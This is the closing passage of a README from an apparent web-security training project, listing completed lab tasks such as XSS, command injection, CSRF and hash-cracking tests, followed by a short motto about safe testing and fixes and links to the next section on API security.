| John hash cracking             | ✅ Completed |
| Reflected XSS testing          | ✅ Completed |
| Stored XSS testing             | ✅ Completed |
| Command injection testing      | ✅ Completed |
| File upload / webshell testing | ✅ Completed |
| CSRF testing                   | ✅ Completed |
| Evidence documentation         | ✅ Completed |

---

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=0:233554,100:0d1117&height=110&section=footer&text=&fontColor=64ffda" width="100%"/>

### Web security is not only about finding vulnerabilities — it is about proving them safely, documenting them clearly, and explaining how to fix them.

[← Back to Main Project](../README.md) | [Next: API Security →](../02-api-security/README.md)

</div>

